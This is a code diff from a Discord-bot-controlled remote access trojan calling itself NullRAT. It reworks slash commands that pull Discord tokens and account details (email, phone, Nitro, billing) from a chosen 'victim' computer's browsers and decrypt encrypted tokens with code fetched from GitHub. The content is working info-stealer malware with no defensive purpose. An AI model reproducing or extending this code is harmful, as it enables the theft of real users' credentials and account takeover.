@@ -13,12 +13,15 @@ class CheckedTokens(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Sends checked tokens along with info (web browsers)",
-        options=[bot.victim],
-    )
+    @commands.slash_command( )
     async def checked_tokens(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """Sends checked tokens along with info (web browsers)
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
 
@@ -50,12 +53,15 @@ class CheckedTokens(commands.Cog):
             
             await ctx.followup.send("Checked all tokens")
 
-    @commands.slash_command(
-        description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens",
-        options=[bot.victim]
-    )
+    @commands.slash_command( )
     async def checked_discord(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             try:
                 tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
@@ -107,7 +113,6 @@ class Menu(discord.ui.View):
         self.first_page.disabled = True
         self.prev_page.disabled = True
 
-        # Sets the footer of the embeds with their respective page numbers.
         for i, embed in enumerate(self.embeds):
             embed.set_footer(text=f"Page {i + 1} of {len(self.embeds)} | Checked by NullRAT")
 
